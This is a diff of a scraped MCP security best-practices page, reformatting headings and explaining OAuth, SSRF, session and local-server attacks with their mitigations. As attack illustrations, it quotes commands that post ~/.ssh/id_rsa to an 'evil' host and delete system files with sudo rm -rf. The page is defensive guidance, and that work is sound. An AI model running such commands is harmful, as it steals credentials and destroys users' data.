@@ -2,8 +2,8 @@
 title: "Security Best Practices - Model Context Protocol"
 source_url: "https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices"
 category: "06-MCP-Tools/General"
-fetched_at: "2026-10-31T06:24:48Z"
-last_modified: "Fri, 30 Oct 2026 20:36:41 GMT"
+fetched_at: "2026-11-16T06:24:36Z"
+last_modified: "Mon, 16 Nov 2026 04:17:41 GMT"
 tags: ["mcp", "security"]
 ---
 
@@ -67,43 +67,27 @@ Security considerations, attack vectors, and best practices for MCP implementati
 
 Copy pageCopy page
 
+## [](#introduction)Introduction
 
-[​](#introduction)
-
-Introduction
-
-
-[​](#purpose-and-scope)
-
-Purpose and Scope
+### [](#purpose-and-scope)Purpose and Scope
 
 This document provides security considerations for the Model Context Protocol (MCP), complementing the [MCP Authorization](https://modelcontextprotocol.io/specification/latest/basic/authorization) specification. This document identifies security risks, attack vectors, and best practices specific to MCP implementations. The primary audience for this document includes developers implementing MCP authorization flows, MCP server operators, and security professionals evaluating MCP-based systems. This document should be read alongside the MCP Authorization specification and [OAuth 2.0 security best practices](https://datatracker.ietf.org/doc/html/rfc9700).
 
-
-[​](#attacks-and-mitigations)
-
-Attacks and Mitigations
+## [](#attacks-and-mitigations)Attacks and Mitigations
 
 This section gives a detailed description of attacks on MCP implementations, along with potential countermeasures.
 
-
-[​](#confused-deputy-problem)
-
-Confused Deputy Problem
+### [](#confused-deputy-problem)Confused Deputy Problem
 
 Attackers can exploit MCP proxy servers that connect to third-party APIs, creating “[confused deputy](https://en.wikipedia.org/wiki/Confused_deputy_problem)” vulnerabilities. This attack allows malicious clients to obtain authorization codes without proper user consent by exploiting the combination of static client IDs, dynamic client registration, and consent cookies.
 
+Dynamic Client Registration is [deprecated](../Spec/2026-07-28-deprecated.md) as of protocol version `2026-07-28`. The attack still applies to MCP proxy servers that support it.
 
-[​](#terminology)
-
-Terminology
+#### [](#terminology)Terminology
 
 **MCP Proxy Server** : An MCP server that connects MCP clients to third-party APIs, offering MCP features while delegating operations and acting as a single OAuth client to the third-party API server. **Third-Party Authorization Server** : Authorization server that protects the third-party API. It may lack dynamic client registration support, requiring the MCP proxy to use a static client ID for all requests. **Third-Party API** : The protected resource server that provides the actual API functionality. Access to this API requires tokens issued by the third-party authorization server. **Static Client ID** : A fixed OAuth 2.0 client identifier used by the MCP proxy server when communicating with the third-party authorization server. This Client ID refers to the MCP server acting as a client to the Third-Party API. It is the same value for all MCP server to Third-Party API interactions regardless of which MCP client initiated the request.
 
-
-[​](#vulnerable-conditions)
-
-Vulnerable Conditions
+#### [](#vulnerable-conditions)Vulnerable Conditions
 
 This attack becomes possible when all of the following conditions are present:
 
@@ -112,19 +96,13 @@ This attack becomes possible when all of the following conditions are present:
 - The third-party authorization server sets a **consent cookie** after the first authorization
 - MCP proxy server does not implement proper per-client consent before forwarding to third-party authorization
 
-
-[​](#architecture-and-attack-flows)
-
-Architecture and Attack Flows
+#### [](#architecture-and-attack-flows)Architecture and Attack Flows
 
 ##### Normal OAuth proxy usage (preserves user consent)
 
 ##### Malicious OAuth proxy usage (skips user consent)
 
-
-[​](#attack-description)
-
-Attack Description
+#### [](#attack-description)Attack Description
 
 When an MCP proxy server uses a static client ID to authenticate with a third-party authorization server, the following attack becomes possible:
 
@@ -137,10 +115,7 @@ When an MCP proxy server uses a static client ID to authenticate with a third-pa
 7.  The attacker exchanges the stolen authorization code for access tokens for the MCP server without the user’s explicit approval
 8.  The attacker now has access to the third-party API as the compromised user
 
-
-[​](#mitigation)
-
-Mitigation
+#### [](#mitigation)Mitigation
 
 To prevent confused deputy attacks, MCP proxy servers **MUST** implement per-client consent and proper security controls as detailed below.
 
@@ -188,20 +163,14 @@ The following diagram shows how to properly implement per-client consent that ru
 
 The consent cookie or session containing the `state` value **MUST NOT** be set until **after** the user has approved the consent screen at the MCP server’s authorization endpoint. Setting this cookie before consent approval renders the consent screen ineffective, as an attacker could bypass it by crafting a malicious authorization request.
 
-
-[​](#token-passthrough)
-
-Token Passthrough
+### [](#token-passthrough)Token Passthrough
 
 “Token passthrough” is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API. An attacker can gain unauthorized access or otherwise compromise an MCP server if the server accepts tokens issued for other resources. This vulnerability has two critical dimensions:
 
 1.  **Audience validation failures.** When an MCP server doesn’t verify that tokens were specifically intended for it (for example, via the audience claim, as mentioned in [RFC9068](https://www.rfc-editor.org/rfc/rfc9068.html)), it may accept tokens originally issued for other services. This breaks a fundamental OAuth security boundary, allowing attackers to reuse legitimate tokens across different services than intended.
 2.  **Token passthrough.** If the MCP server not only accepts tokens with incorrect audiences but also forwards these unmodified tokens to downstream services, it can potentially cause the [“confused deputy” problem](#confused-deputy-problem), where the downstream API may incorrectly trust the token as if it came from the MCP server or assume the token was validated by the upstream API.
 
-
-[​](#risks)
-
-Risks
+#### [](#risks)Risks
 
 Token passthrough is explicitly forbidden in the [authorization specification](https://modelcontextprotocol.io/specification/latest/basic/authorization) as it introduces a number of security risks, that include:
 
@@ -218,24 +187,15 @@ Token passthrough is explicitly forbidden in the [authorization specification](h
 - **Future Compatibility Risk**
   - Even if an MCP Server starts as a “pure proxy” today, it might need to add security controls later. Starting with proper token audience separation makes it easier to evolve the security model.
 
-
-[​](#mitigation-2)
-
-Mitigation
+#### [](#mitigation-2)Mitigation
 
 MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.
 
-
-[​](#server-side-request-forgery-ssrf)
-
-Server-Side Request Forgery (SSRF)
+### [](#server-side-request-forgery-ssrf)Server-Side Request Forgery (SSRF)
 
 Server-Side Request Forgery (SSRF) is an attack where an attacker can induce an MCP client to make HTTP requests to unintended destinations, potentially accessing internal network resources, cloud metadata endpoints, or other protected services.
 
-
-[​](#attack-description-2)
-
-Attack Description
+#### [](#attack-description-2)Attack Description
 
 During OAuth metadata discovery, MCP clients fetch URLs from several sources that could be controlled by a malicious MCP server:
 
@@ -251,10 +211,7 @@ A malicious MCP server can populate these fields with URLs pointing to internal 
 - **DNS rebinding**: Domains that change DNS resolution between validation and use (e.g., `https://attacker.com` resolving to a safe IP initially, then to `192.168.1.1`)
 - **Redirect chains**: Normal-looking URLs that redirect to internal resources
 
-
-[​](#risks-2)
-
-Risks
+#### [](#risks-2)Risks
 
 - **Credential exfiltration**: Cloud metadata endpoints often expose IAM credentials, API keys, and other secrets
 - **Internal network reconnaissance**: Error messages reveal information about internal network topology and services
@@ -262,10 +219,7 @@ Risks
 - **Firewall bypass**: The MCP client acts as a proxy, bypassing network perimeter controls
 - **Data exfiltration**: Internal service responses may be reflected back to attackers through error messages or OAuth flows
 
-
-[​](#mitigation-3)
-
-Mitigation
+#### [](#mitigation-3)Mitigation
 
 MCP clients deployed to a server **MUST** consider SSRF risks and implement appropriate mitigations when fetching OAuth-related URLs. Which protections are appropriate depend on your network environment. **Enforce HTTPS** MCP clients **SHOULD** require HTTPS for all OAuth-related URLs in production environments:
 
@@ -300,58 +254,37 @@ Avoid implementing IP validation manually. Attackers exploit encoding tricks (oc
 - Consider pinning DNS resolution results between check and use
 - Defense in depth: combine DNS checks with other mitigations
 
-
-[​](#ssrf-against-authorization-servers)
-
-SSRF Against Authorization Servers
+#### [](#ssrf-against-authorization-servers)SSRF Against Authorization Servers
 
 SSRF risks are not limited to MCP clients. When an authorization server supports [Client ID Metadata Documents](../Spec/2026-07-28-basic-authorization-client-registration.md#client-id-metadata-documents), the authorization server takes a URL as input from an unknown client and fetches that URL. A malicious client could use this to trigger the authorization server to make requests to arbitrary URLs, such as requests to private administration endpoints the authorization server has access to. The mitigations described above, such as blocking private IP ranges and using egress proxies, apply equally to authorization servers fetching client metadata documents. See [Server Side Request Forgery (SSRF) Attacks](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-client-id-metadata-document-00#name-server-side-request-forgery) in the Client ID Metadata Document specification for further guidance.
 
-
-[​](#resources-and-tools)
-
-Resources and Tools
+#### [](#resources-and-tools)Resources and Tools
 
 The following resources can help developers implement SSRF protections in MCP clients. **Reference Documentation**
 
 - [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html): Comprehensive guidance on SSRF prevention techniques, including input validation, allowlist strategies, and network-level controls
 - [OWASP Top 10 A10:2021 - SSRF](https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/): SSRF in the context of the most critical web application security risks
 
-
-[​](#state-handle-hijacking)
-
-State Handle Hijacking
+### [](#state-handle-hijacking)State Handle Hijacking
 
 MCP is [stateless](https://modelcontextprotocol.io/specification/2026-07-28/basic/index#statelessness) and has no protocol-level sessions. Servers that need state spanning multiple requests mint an explicit handle, such as a shopping cart ID or a workflow ID, and receive it back as an ordinary tool argument on each request. State handle hijacking is an attack vector where an unauthorized party obtains or guesses such a handle and uses it to access or modify another user’s state.
 
-
-[​](#attack-description-3)
-
-Attack Description
+#### [](#attack-description-3)Attack Description
 
 1.  The MCP server mints a state handle for an authenticated user and returns it in a tool result.
 2.  The attacker obtains or guesses the handle.
 3.  The attacker calls the MCP server’s tools with the handle as an argument.
 4.  The MCP server does not check whether the handle belongs to the caller and operates on the original user’s state, allowing unauthorized access or actions.
 
-
-[​](#mitigation-4)
-
-Mitigation
+#### [](#mitigation-4)Mitigation
 
 MCP servers that implement authorization **MUST** verify all inbound requests. MCP servers **MUST NOT** treat possession of a state handle as authentication. MCP servers **SHOULD** use secure, non-deterministic handles generated with secure random number generators. Avoid predictable or sequential identifiers that could be guessed by an attacker. Expiring handles can also reduce the risk. MCP servers **SHOULD** bind handles server-side to the authenticated user, for example by keying stored state as `<user_id>:<handle>` where the user ID is derived from the verified token rather than supplied by the client, and reject a handle presented by any other principal. This ensures that even if an attacker guesses a handle, they cannot impersonate another user. For guidance on securing the server-assigned session IDs used by protocol version `2025-11-25` and earlier, see [Session Hijacking in the 2025-11-25 version of this page](2025-11-25-tutorials-security-security-best-practices.md#session-hijacking).
 
-
-[​](#local-mcp-server-compromise)
-
-Local MCP Server Compromise
+### [](#local-mcp-server-compromise)Local MCP Server Compromise
 
 Local MCP servers are MCP Servers running on a user’s local machine, either by the user downloading and executing a server, authoring a server themselves, or installing through a client’s configuration flows. These servers may have direct access to the user’s system and may be accessible to other processes running on the user’s machine, making them attractive targets for attacks.
 
-
-[​](#attack-description-4)
-
-Attack Description
+#### [](#attack-description-4)Attack Description
 
 Local MCP servers are binaries that are downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements in place, the following attacks become possible:
 
@@ -369,10 +302,7 @@ npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil
 sudo rm -rf /important/system/files && echo "MCP server installed!"
 ```
 
-
-[​](#risks-3)
-
-Risks
+#### [](#risks-3)Risks
 
 Local MCP servers with inadequate restrictions or from untrusted sources introduce several critical security risks:
 
@@ -382,10 +312,7 @@ Local MCP servers with inadequate restrictions or from untrusted sources introdu
 - **Data exfiltration**. Attackers can access legitimate local MCP servers via compromised JavaScript.
 - **Data loss**. Attackers or bugs in legitimate servers could lead to irrecoverable data loss on the host machine.
 
-
-[​](#mitigation-5)
-
-Mitigation
+#### [](#mitigation-5)Mitigation
 
 If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands. **Pre-Configuration Consent** Display a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:
 
@@ -412,17 +339,11 @@ MCP servers intending for their servers to be run locally **SHOULD** implement m
   - Require an authorization token
   - Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access
 
-
-[​](#oauth-authorization-url-validation)
-
-OAuth Authorization URL Validation
+### [](#oauth-authorization-url-validation)OAuth Authorization URL Validation
 
 OAuth authorization URLs provided by malicious MCP servers can exploit client-side URL handling vulnerabilities, leading to Cross-Site Scripting (XSS) attacks and Remote Code Execution (RCE).
 
-
-[​](#attack-description-5)
-
-Attack Description
+#### [](#attack-description-5)Attack Description
 
 During the OAuth authorization flow, MCP servers provide authorization URLs that clients open in browsers or handle programmatically. Malicious servers can exploit insufficient URL validation in MCP clients through the following attack vectors: **JavaScript URL Injection (XSS)**
 
@@ -440,10 +361,7 @@ During the OAuth authorization flow, MCP servers provide authorization URLs that
 
 **stdio Transport Privilege Escalation** When XSS vulnerabilities are combined with `stdio` transport capabilities, attackers can escalate web-based attacks to full system compromise. See [stdio Transport Security in Proxy Scenarios](#stdio-transport-security-in-proxy-scenarios) for detailed attack vectors and mitigations.
 
-
-[​](#risks-4)
-
-Risks
+#### [](#risks-4)Risks
 
 OAuth authorization URL vulnerabilities introduce several critical security risks:
 
@@ -453,10 +371,7 @@ OAuth authorization URL vulnerabilities introduce several critical security risk
 - **Data Exfiltration**. Attackers can access sensitive data, configuration files, and credentials stored on the user’s system.
 - **Persistence**. Attackers can install malware, create backdoors, or modify system configurations for persistent access.
 
-
-[​](#mitigation-6)
-
-Mitigation
+#### [](#mitigation-6)Mitigation
 
 **URL Scheme Validation** MCP clients **MUST** validate authorization URLs and reject dangerous schemes:
 
@@ -482,17 +397,11 @@ Mitigation
 - Consider using dedicated URL sanitization libraries
 - Log suspicious authorization URLs for security monitoring
 
-
-[​](#stdio-transport-security-in-proxy-scenarios)
-
-stdio Transport Security in Proxy Scenarios
+### [](#stdio-transport-security-in-proxy-scenarios)stdio Transport Security in Proxy Scenarios
 
 The `stdio` transport itself is not inherently vulnerable. However, in proxy architectures where a separate proxy service manages `stdio` connections and can spawn MCP servers as child processes, it can provide a critical escalation path from web-based attacks to full system compromise.
 
-
-[​](#attack-description-6)
-
-Attack Description
+#### [](#attack-description-6)Attack Description
 
 **Important**: This attack vector only applies to MCP implementations that use a proxy architecture, not to direct `stdio` transport usage. In proxy-based MCP implementations, a local proxy service sits between the client and MCP servers, spawning servers as child processes via the `stdio` transport. This architecture creates a privileged escalation path when combined with client-side vulnerabilities:
 
@@ -502,19 +411,13 @@ Attack Description
 4.  Proxy spawns arbitrary commands via the `stdio` transport (believing they are legitimate MCP server commands)
 5.  Attacker achieves Remote Code Execution with user privileges
 
-
-[​](#risks-5)
-
-Risks
+#### [](#risks-5)Risks
 
 - **Privilege Escalation**. Web-based vulnerabilities (XSS) can escalate to arbitrary code execution on the host system through proxy command execution
 - **Authentication Bypass**. Stolen proxy authentication tokens allow unauthorized access to stdio process spawning capabilities
 - **System Compromise**. Attackers can execute any command that the MCP proxy process has privileges to run
 
-
-[​](#mitigation-7)
-
-Mitigation
+#### [](#mitigation-7)Mitigation
 
 The primary defense is to prevent classes of vulnerabilities that enable this attack vector:
 
@@ -536,36 +439,21 @@ Since XSS fundamentally compromises the client’s security context, focus on li
 - Implement process-level sandboxing for the proxy service itself
 - Consider running the proxy in a container or restricted environment
 
+### [](#mix-up-attacks)Mix-Up Attacks
 
-[​](#mix-up-attacks)
-
-Mix-Up Attacks
-
-
-[​](#attack-description-7)
-
-Attack Description
+#### [](#attack-description-7)Attack Description
 
 An MCP client typically interacts with many authorization servers over its lifetime. An attacker that controls one of those authorization servers may attempt to have the client send it an authorization code or token issued by a different, honest authorization server (a mix-up attack, described in [RFC9207 Section 1](https://datatracker.ietf.org/doc/html/rfc9207#section-1)).
 
-
-[​](#mitigation-8)
-
-Mitigation
+#### [](#mitigation-8)Mitigation
 
 [Authorization Response Validation](../Spec/2026-07-28-basic-authorization.md#authorization-response-validation) mitigates this by binding the response to the authorization server the client recorded before redirecting, so the authorization code cannot be redeemed at an unintended token endpoint. PKCE alone does not prevent this attack because the client transmits the `code_verifier` to the attacker’s token endpoint. Resource indicators do not help when the attacker’s authorization server is intercepting requests before they hit the honest authorization server. This mitigation depends on honest authorization servers emitting `iss`; it provides no protection against an honest server that does not.
 
-
-[​](#localhost-redirect-uri-impersonation)
-
-Localhost Redirect URI Impersonation
+### [](#localhost-redirect-uri-impersonation)Localhost Redirect URI Impersonation
 
 Native and locally-running MCP clients commonly use `localhost` redirect URIs. When clients identify themselves with [Client ID Metadata Documents](../Spec/2026-07-28-basic-authorization-client-registration.md#client-id-metadata-documents), the metadata document proves control of a domain, but it cannot prove which local process is listening on a `localhost` redirect URI.
 
-
-[​](#attack-description-8)
-
-Attack Description
+#### [](#attack-description-8)Attack Description
 
 An attacker can claim to be any client by:
 
@@ -575,17 +463,11 @@ An attacker can claim to be any client by:
 
 The server will see the legitimate client’s metadata document and the user will see the legitimate client’s name, making attack detection difficult.
 
-
-[​](#mitigation-9)
-
-Mitigation
+#### [](#mitigation-9)Mitigation
 
 See [Localhost Redirect URI Risks](../Spec/draft-basic-authorization-security-considerations.md#localhost-redirect-uri-risks) in the authorization specification for the countermeasures expected of authorization servers, including displaying additional warnings for `localhost`-only redirect URIs and clearly displaying the redirect URI hostname during authorization.
 
-
-[​](#cimd-trust-policies)
-
-CIMD Trust Policies
+### [](#cimd-trust-policies)CIMD Trust Policies
 
 Authorization servers that accept [Client ID Metadata Documents](../Spec/2026-07-28-basic-authorization-client-registration.md#client-id-metadata-documents) can apply domain-based trust policies to decide which URL-based client IDs to accept:
 
@@ -597,24 +479,15 @@ Authorization servers that accept [Client ID Metadata Documents](../Spec/2026-07
 
 Servers maintain full control over their access policies. See [Trust Policies](../Spec/draft-basic-authorization-security-considerations.md#trust-policies) in the authorization specification, along with [Section 6.4](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.4) and [Section 6.8](https://www.ietf.org/archive/id/draft-ietf-oauth-client-id-metadata-document-00.html#section-6.8) of the Client ID Metadata Document specification, for more details.
 
-
-[​](#scope-minimization)
-
-Scope Minimization
+### [](#scope-minimization)Scope Minimization
 
 Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails.
 
-
-[​](#attack-description-9)
-
-Attack Description
+#### [](#attack-description-9)Attack Description
 
 An attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables lateral data access, privilege chaining, and difficult revocation without re-consenting the entire surface.
 
-
-[​](#risks-6)
-
-Risks
+#### [](#risks-6)Risks
 
 - Expanded blast radius: stolen broad token enables unrelated tool/resource access
 - Higher friction on revocation: revoking a max-privilege token disrupts all workflows
@@ -623,10 +496,7 @@ Risks
 - Consent abandonment: users decline dialogs listing excessive scopes
 - Scope inflation blindness: lack of metrics makes over-broad requests normalised
 
-
-[​](#mitigation-10)
-
-Mitigation
+#### [](#mitigation-10)Mitigation
 
 Implement a progressive, least-privilege scope model:
 
@@ -656,10 +526,7 @@ Scope accumulation across operations is a client-side responsibility. Clients **
 
 **Hierarchical scopes**: Some authorization servers define scope hierarchies where a broader scope implies narrower ones (for example, an `admin` scope that subsumes `read`). When accumulating scopes, the client’s union may contain semantically redundant entries. For example, a token previously granted a broad scope may be challenged with a narrower one it already implies. Clients need not deduplicate hierarchically; authorization servers typically normalize such redundancy during token issuance. Servers, for their part, must account for hierarchy when deciding whether a token is sufficient for an operation, but this does not affect the scopes they emit in a challenge.
 
-
-[​](#common-mistakes)
-
-Common Mistakes
+#### [](#common-mistakes)Common Mistakes
 
 - Publishing all possible scopes in `scopes_supported`
 - Using wildcard or omnibus scopes (`*`, `all`, `full-access`)
